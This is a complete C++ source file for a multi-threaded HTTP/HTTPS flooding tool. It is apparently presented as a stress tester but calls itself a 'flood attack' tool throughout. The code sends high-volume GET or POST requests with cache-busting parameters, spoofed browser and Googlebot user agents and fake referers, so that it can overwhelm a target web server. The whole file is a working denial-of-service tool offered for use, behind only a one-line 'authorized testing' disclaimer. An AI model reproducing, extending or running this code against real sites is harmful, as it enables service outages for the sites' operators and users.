/**
 * Advanced HTTP Flooder - C++ Implementation
 * 
 * This is a high-performance stress testing tool designed to utilize
 * system resources efficiently through multi-threading and asynchronous I/O.
 * For educational and authorized testing purposes only.
 */

#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <functional>
#include <future>

// Network related includes
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSE_SOCKET closesocket
    typedef SOCKET socket_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <sys/types.h>
    #include <netinet/tcp.h>
    #define CLOSE_SOCKET close
    #define SOCKET_ERROR -1
    typedef int socket_t;
#endif

// OpenSSL for HTTPS
#include <openssl/ssl.h>
#include <openssl/err.h>

// Configurable parameters
std::atomic<bool> running(false);
std::condition_variable cv_start;
std::mutex mtx_start;
std::mutex mtx_console;

// Colorful console output
#ifdef _WIN32
    #include <windows.h>
    void setColor(int color) {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, color);
    }
    #define COLOR_RED 12
    #define COLOR_GREEN 10
    #define COLOR_BLUE 9
    #define COLOR_YELLOW 14
    #define COLOR_MAGENTA 13
    #define COLOR_CYAN 11
    #define COLOR_WHITE 15
    #define COLOR_RESET 15
#else
    void setColor(int color) {
        std::string colorCode;
        switch(color) {
            case 12: colorCode = "\033[31m"; break; // Red
            case 10: colorCode = "\033[32m"; break; // Green
            case 9: colorCode = "\033[34m"; break;  // Blue
            case 14: colorCode = "\033[33m"; break; // Yellow
            case 13: colorCode = "\033[35m"; break; // Magenta
            case 11: colorCode = "\033[36m"; break; // Cyan
            case 15: colorCode = "\033[0m"; break;  // Reset/White
            default: colorCode = "\033[0m"; break;  // Default
        }
        std::cout << colorCode;
    }
    #define COLOR_RED 12
    #define COLOR_GREEN 10
    #define COLOR_BLUE 9
    #define COLOR_YELLOW 14
    #define COLOR_MAGENTA 13
    #define COLOR_CYAN 11
    #define COLOR_WHITE 15
    #define COLOR_RESET 15
#endif

class HTTPFlooder {
private:
    std::string host;
    std::string port;
    std::string page;
    std::string mode;
    std::string key;
    std::string customHeaders;
    int threadCount;
    int duration;
    bool useSSL;
    
    // HTTP headers and user agents
    const std::vector<std::string> acceptHeaders = {
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
    };

    const std::vector<std::string> platformChoices = {"Macintosh", "Windows", "X11"};
    const std::vector<std::string> macChoices = {"68K", "PPC", "Intel Mac OS X"};
    const std::vector<std::string> windowsChoices = {"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"};
    const std::vector<std::string> linuxChoices = {"Linux i686", "Linux x86_64"};
    const std::vector<std::string> browserChoices = {"chrome", "spider", "ie"};
    const std::vector<std::string> extraChoices = {".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"};
    
    const std::vector<std::string> spiderChoices = {
        "AdsBot-Google ( http://www.google.com/adsbot.html)",
        "Baiduspider ( http://www.baidu.com/search/spider.htm)",
        "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
        "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
        "Googlebot-Image/1.0",
        "Googlebot-News",
        "Googlebot-Video/1.0",
    };
    
    const std::vector<std::string> referrerChoices = {
        "https://www.google.com/search?q=",
        "https://check-host.net/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.fbi.com/",
        "https://www.bing.com/search?q=",
        "https://r.search.yahoo.com/",
        "https://www.cia.gov/index.html",
        "https://vk.com/profile.php?auto=",
        "https://www.usatoday.com/search/results?q=",
        "https://help.baidu.com/searchResult?keywords=",
        "https://steamcommunity.com/market/search?q=",
        "https://www.ted.com/search?q=",
        "https://play.google.com/store/search?q=",
    };

    // Thread status tracking
    std::atomic<int> activeThreads{0};
    std::atomic<uint64_t> sentRequests{0};
    std::atomic<uint64_t> successfulRequests{0};
    std::atomic<uint64_t> failedRequests{0};
    
    // Random generation
    std::random_device rd;
    std::mt19937 gen;
    const std::string alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    
public:
    HTTPFlooder(const std::string& targetUrl, const std::string& requestMode, 
                int threads, int timeLimit, const std::string& headerFile) 
    : threadCount(threads), duration(timeLimit), gen(rd()) {
        
        parseURL(targetUrl);
        mode = requestMode;
        
        // Load custom headers if provided
        if (headerFile != "nil") {
            loadHeadersFromFile(headerFile);
        }
        
        // Initialize OpenSSL for HTTPS connections
        if (useSSL) {
            SSL_library_init();
            SSL_load_error_strings();
            OpenSSL_add_all_algorithms();
        }
        
        // Initialize socket library on Windows
        #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("Failed to initialize Winsock");
        }
        #endif
    }
    
    ~HTTPFlooder() {
        // Cleanup SSL
        if (useSSL) {
            ERR_free_strings();
            EVP_cleanup();
        }
        
        // Cleanup Winsock on Windows
        #ifdef _WIN32
        WSACleanup();
        #endif
    }
    
    void start() {
        std::vector<std::thread> threads;
        threads.reserve(threadCount);
        
        printBanner();
        
        // Create and start worker threads
        for (int i = 0; i < threadCount; ++i) {
            threads.emplace_back(&HTTPFlooder::floodWorker, this);
            {
                std::lock_guard<std::mutex> lock(mtx_console);
                setColor(COLOR_CYAN);
                std::cout << "\rInitializing threads [" << (i + 1) << "/" << threadCount << "]" << std::flush;
            }
            std::this_thread::sleep_for(std::chrono::microseconds(50));
        }
        
        {
            std::lock_guard<std::mutex> lock(mtx_console);
            setColor(COLOR_GREEN);
            std::cout << "\nAll " << threadCount << " threads are ready!" << std::endl;
            setColor(COLOR_YELLOW);
            std::cout << "Press [Enter] to start the flood attack..." << std::flush;
            setColor(COLOR_RESET);
        }
        
        // Wait for user to press Enter
        std::cin.get();
        
        {
            std::lock_guard<std::mutex> lock(mtx_console);
            setColor(COLOR_RED);
            std::cout << "\nStarting flood attack on " << host << ":" << port << page << std::endl;
            std::cout << "Attack will run for " << duration << " seconds" << std::endl;
            setColor(COLOR_RESET);
        }
        
        // Signal all threads to start
        {
            std::lock_guard<std::mutex> lock(mtx_start);
            running = true;
        }
        cv_start.notify_all();
        
        // Start stats monitor thread
        std::thread statsThread(&HTTPFlooder::monitorStats, this);
        
        // Wait for the duration
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        
        // Signal all threads to stop
        running = false;
        
        // Wait for all threads to complete
        for (auto& t : threads) {
            if (t.joinable()) {
                t.join();
            }
        }
        
        // Wait for stats thread
        if (statsThread.joinable()) {
            statsThread.join();
        }
        
        // Print final stats
        printFinalStats();
    }

private:
    void parseURL(const std::string& url) {
        // Extract protocol (http or https)
        size_t protocolEnd = url.find("://");
        if (protocolEnd != std::string::npos) {
            std::string protocol = url.substr(0, protocolEnd);
            useSSL = (protocol == "https");
        } else {
            useSSL = false;
            protocolEnd = -3; // Adjust for the next calculation
        }
        
        // Extract host and path
        size_t hostStart = protocolEnd + 3;
        size_t pathStart = url.find('/', hostStart);
        
        if (pathStart != std::string::npos) {
            host = url.substr(hostStart, pathStart - hostStart);
            page = url.substr(pathStart);
        } else {
            host = url.substr(hostStart);
            page = "/";
        }
        
        // Extract port if specified
        size_t portStart = host.find(':');
        if (portStart != std::string::npos) {
            port = host.substr(portStart + 1);
            host = host.substr(0, portStart);
        } else {
            port = useSSL ? "443" : "80";
        }
        
        // Determine key for GET parameters
        key = (page.find('?') != std::string::npos) ? "&" : "?";
    }
    
    void loadHeadersFromFile(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open header file: " << filename << std::endl;
            return;
        }
        
        std::stringstream buffer;
        buffer << file.rdbuf();
        customHeaders = buffer.str();
    }
    
    std::string generateRandomString(int length) {
        std::uniform_int_distribution<> distrib(0, alphanum.size() - 1);
        std::string result;
        result.reserve(length);
        
        for (int i = 0; i < length; ++i) {
            result += alphanum[distrib(gen)];
        }
        
        return result;
    }
    
    std::string getRandomUserAgent() {
        std::uniform_int_distribution<> platformDist(0, platformChoices.size() - 1);
        std::string platform = platformChoices[platformDist(gen)];
        std::string os;
        
        if (platform == "Macintosh") {
            std::uniform_int_distribution<> macDist(0, macChoices.size() - 1);
            os = macChoices[macDist(gen)];
        } else if (platform == "Windows") {
            std::uniform_int_distribution<> winDist(0, windowsChoices.size() - 1);
            os = windowsChoices[winDist(gen)];
        } else { // X11
            std::uniform_int_distribution<> linuxDist(0, linuxChoices.size() - 1);
            os = linuxChoices[linuxDist(gen)];
        }
        
        std::uniform_int_distribution<> browserDist(0, browserChoices.size() - 1);
        std::string browser = browserChoices[browserDist(gen)];
        
        if (browser == "chrome") {
            std::uniform_int_distribution<> webkitDist(500, 599);
            int webkit = webkitDist(gen);
            
            std::uniform_int_distribution<> verDist(0, 99);
            std::uniform_int_distribution<> subVerDist(0, 9999);
            std::uniform_int_distribution<> buildDist(0, 999);
            
            std::stringstream ua;
            ua << "Mozilla/5.0 (" << os << ") AppleWebKit/" << webkit << ".0 (KHTML, like Gecko) Chrome/"
               << verDist(gen) << ".0." << subVerDist(gen) << "." << buildDist(gen) << " Safari/" << webkit;
            
            return ua.str();
        } else if (browser == "ie") {
            std::uniform_int_distribution<> verDist(0, 99);
            std::uniform_int_distribution<> engineDist(0, 99);
            std::uniform_int_distribution<> optionDist(0, 1);
            
            std::stringstream ua;
            ua << "Mozilla/5.0 (compatible; MSIE " << verDist(gen) << ".0; " << os;
            
            if (optionDist(gen) == 1) {
                std::uniform_int_distribution<> tokenDist(0, extraChoices.size() - 1);
                ua << "; " << extraChoices[tokenDist(gen)] << "; ";
            }
            
            ua << "Trident/" << engineDist(gen) << ".0)";
            return ua.str();
        }
        
        // Return a spider UA
        std::uniform_int_distribution<> spiderDist(0, spiderChoices.size() - 1);
        return spiderChoices[spiderDist(gen)];
    }
    
    std::string getRandomReferer() {
        std::uniform_int_distribution<> dist(0, referrerChoices.size() - 1);
        return referrerChoices[dist(gen)];
    }
    
    std::string getRandomAcceptHeader() {
        std::uniform_int_distribution<> dist(0, acceptHeaders.size() - 1);
        return acceptHeaders[dist(gen)];
    }
    
    std::string craftHTTPRequest() {
        std::stringstream request;
        
        if (mode == "get") {
            // Generate random parameters to bypass caching
            std::uniform_int_distribution<> dist(0, INT_MAX);
            std::string randomParam = generateRandomString(8);
            
            request << "GET " << page << key << randomParam << "=" << dist(gen) << " HTTP/1.1\r\n";
            request << "Host: " << host << ":" << port << "\r\n";
            
            if (customHeaders.empty()) {
                request << "Connection: Keep-Alive\r\n";
                request << "Cache-Control: max-age=0\r\n";
                request << "User-Agent: " << getRandomUserAgent() << "\r\n";
                request << getRandomAcceptHeader();
                request << "Referer: " << getRandomReferer() << "\r\n";
            } else {
                request << customHeaders;
            }
        } else if (mode == "post") {
            std::string data = customHeaders.empty() ? "f" : customHeaders;
            
            request << "POST " << page << " HTTP/1.1\r\n";
            request << "Host: " << host << ":" << port << "\r\n";
            request << "Connection: Keep-Alive\r\n";
            request << "Content-Type: application/x-www-form-urlencoded\r\n";
            request << "Content-Length: " << data.length() << "\r\n";
            request << "Accept-Encoding: gzip, deflate\r\n\r\n";
            request << data;
        }
        
        request << "\r\n";
        return request.str();
    }
    
    bool sendRequest(socket_t sock, SSL* ssl, const std::string& request) {
        const char* data = request.c_str();
        size_t totalSent = 0;
        size_t dataLen = request.length();
        
        while (totalSent < dataLen) {
            int sent;
            if (useSSL) {
                sent = SSL_write(ssl, data + totalSent, dataLen - totalSent);
            } else {
                sent = send(sock, data + totalSent, dataLen - totalSent, 0);
            }
            
            if (sent <= 0) {
                return false;
            }
            
            totalSent += sent;
        }
        
        return true;
    }
    
    void floodWorker() {
        activeThreads++;
        
        // Wait for start signal
        {
            std::unique_lock<std::mutex> lock(mtx_start);
            cv_start.wait(lock, [] { return running.load(); });
        }
        
        while (running) {
            socket_t sock = SOCKET_ERROR;
            SSL* ssl = nullptr;
            SSL_CTX* ctx = nullptr;
            
            try {
                // Create socket
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock == SOCKET_ERROR) {
                    throw std::runtime_error("Failed to create socket");
                }
                
                // Set socket options
                int flag = 1;
                setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));
                
                // Set non-blocking mode
                #ifdef _WIN32
                u_long mode = 1;
                ioctlsocket(sock, FIONBIO, &mode);
                #else
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                #endif
                
                // Resolve host name
                struct addrinfo hints, *res;
                memset(&hints, 0, sizeof(hints));
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                
                if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res) != 0) {
                    throw std::runtime_error("Failed to resolve hostname");
                }
                
                // Connect with timeout
                connect(sock, res->ai_addr, res->ai_addrlen);
                
                // Check if connection is in progress
                fd_set fdset;
                struct timeval tv;
                FD_ZERO(&fdset);
                FD_SET(sock, &fdset);
                tv.tv_sec = 2;
                tv.tv_usec = 0;
                
                if (select(sock + 1, nullptr, &fdset, nullptr, &tv) == 1) {
                    int so_error;
                    socklen_t len = sizeof(so_error);
                    getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&so_error, &len);
                    
                    if (so_error != 0) {
                        throw std::runtime_error("Connection failed");
                    }
                } else {
                    throw std::runtime_error("Connection timeout");
                }
                
                freeaddrinfo(res);
                
                // Set back to blocking mode
                #ifdef _WIN32
                mode = 0;
                ioctlsocket(sock, FIONBIO, &mode);
                #else
                fcntl(sock, F_SETFL, flags);
                #endif
                
                // Setup SSL if needed
                if (useSSL) {
                    ctx = SSL_CTX_new(SSLv23_client_method());
                    if (!ctx) {
                        throw std::runtime_error("Failed to create SSL context");
                    }
                    
                    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
                    SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
                    
                    ssl = SSL_new(ctx);
                    if (!ssl) {
                        throw std::runtime_error("Failed to create SSL structure");
                    }
                    
                    SSL_set_fd(ssl, sock);
                    SSL_set_tlsext_host_name(ssl, host.c_str());
                    
                    if (SSL_connect(ssl) != 1) {
                        throw std::runtime_error("SSL connection failed");
                    }
                }
                
                // Send multiple requests over the same connection
                const int requestsPerConnection = 100;
                for (int i = 0; i < requestsPerConnection && running; ++i) {
                    std::string request = craftHTTPRequest();
                    if (sendRequest(sock, ssl, request)) {
                        sentRequests++;
                        successfulRequests++;
                    } else {
                        failedRequests++;
                        break;
                    }
                }
                
            } catch (const std::exception&) {
                failedRequests++;
            }
            
            // Clean up
            if (ssl) {
                SSL_shutdown(ssl);
                SSL_free(ssl);
            }
            
            if (ctx) {
                SSL_CTX_free(ctx);
            }
            
            if (sock != SOCKET_ERROR) {
                CLOSE_SOCKET(sock);
            }
            
            // Small delay to prevent CPU maxing out
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        
        activeThreads--;
    }
    
    void monitorStats() {
        auto startTime = std::chrono::steady_clock::now();
        uint64_t lastSent = 0;
        
        while (running) {
            auto currentTime = std::chrono::steady_clock::now();
            auto elapsedSeconds = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
            
            if (elapsedSeconds > 0) {
                uint64_t currentSent = sentRequests.load();
                uint64_t rps = (currentSent - lastSent);
                lastSent = currentSent;
                
                std::lock_guard<std::mutex> lock(mtx_console);
                setColor(COLOR_CYAN);
                std::cout << "\r[" << elapsedSeconds << "s] ";
                setColor(COLOR_GREEN);
                std::cout << "Requests: " << currentSent << " (" << rps << "/s) ";
                setColor(COLOR_RED);
                std::cout << "Failed: " << failedRequests.load() << " ";
                setColor(COLOR_YELLOW);
                std::cout << "Active Threads: " << activeThreads.load() << "   " << std::flush;
                setColor(COLOR_RESET);
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    
    void printBanner() {
        std::lock_guard<std::mutex> lock(mtx_console);
        setColor(COLOR_RED);
        std::cout << R"(
   ▄█    █▄     ▄████████ ███    █▄     ▄████████ ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄  
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ 
  ███    ███   ███    ███ ███    ███   ███    █▀    ███    ███ ███    ███ ███   ███   ███   ███    ███ 
 ▄███▄▄▄▄███▄▄ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀  
▀▀███▀▀▀▀███▀  ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  
  ███    ███   ███    ███ ███    ███   ███    █▄    ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄ 
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███ ███   ███   ███   ███    ███ 
  ███    █▀    ███    █▀  ████████▀    ██████████ ▄█████████▀   ▀██████▀  ▀█   ███   █▀  ▄█████████▀  

                             C++ HIGH PERFORMANCE HTTP FLOODER
                           OPTIMIZED FOR MAXIMUM SYSTEM RESOURCE USAGE
)" << std::endl;
        setColor(COLOR_YELLOW);
        std::cout << "Target: " << (useSSL ? "https://" : "http://") << host << ":" << port << page << std::endl;
        std::cout << "Mode: " << mode << ", Threads: " << threadCount << ", Duration: " << duration << " seconds" << std::endl;
        setColor(COLOR_RESET);
    }
    
    void printFinalStats() {
        auto elapsedTime = duration;
        uint64_t total = sentRequests.load();
        uint64_t failed = failedRequests.load();
        uint64_t successful = successfulRequests.load();
        
        std::lock_guard<std::mutex> lock(mtx_console);
        setColor(COLOR_GREEN);
        std::cout << "\n\n===== Final Attack Statistics =====" << std::endl;
        setColor(COLOR_CYAN);
        std::cout << "Duration: " << elapsedTime << " seconds" << std::endl;
        std::cout << "Total Requests Sent: " << total << std::endl;
        std::cout << "Successful Requests: " << successful << std::endl;
        setColor(COLOR_RED);
        std::cout << "Failed Requests: " << failed << std::endl;
        setColor(COLOR_GREEN);
        std::cout << "Average RPS: " << (elapsedTime > 0 ? total / elapsedTime : 0) << std::endl;
        setColor(COLOR_RESET);
        std::cout << "===============================" << std::endl;
    }
};

void printUsage(const char* programName) {
    std::cerr << "Advanced HTTP Flooder - C++ Implementation" << std::endl;
    std::cerr << "Usage: " << programName << " <url> <threads> <get/post> <seconds> <header_file/nil>" << std::endl;
    std::cerr << std::endl;
    std::cerr << "Parameters:" << std::endl;
    std::cerr << "  url          - Target URL (e.g., http://example.com or https://example.com/page)" << std::endl;
    std::cerr << "  threads      - Number of threads to use" << std::endl;
    std::cerr << "  get/post     - HTTP request method" << std::endl;
    std::cerr << "  seconds      - Duration of the attack in seconds" << std::endl;
    std::cerr << "  header_file  - File containing custom HTTP headers or 'nil' to use default headers" << std::endl;
    std::cerr << std::endl;
    std::cerr << "Example: " << programName << " http://example.com 100 get 30 nil" << std::endl;
    
    #ifndef _WIN32
    std::cerr << "Note: On Unix systems, run 'ulimit -n 999999' before starting for best performance." << std::endl;
    #endif
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        printUsage(argv[0]);
        return 1;
    }
    
    std::string url = argv[1];
    int threads;
    int duration;
    
    try {
        threads = std::stoi(argv[2]);
        duration = std::stoi(argv[4]);
    } catch (const std::exception&) {
        std::cerr << "Error: Threads and duration must be integers." << std::endl;
        return 1;
    }
    
    std::string mode = argv[3];
    if (mode != "get" && mode != "post") {
        std::cerr << "Error: Mode must be either 'get' or 'post'." << std::endl;
        return 1;
    }
    
    std::string headerFile = argv[5];
    
    try {
        HTTPFlooder flooder(url, mode, threads, duration, headerFile);
        flooder.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}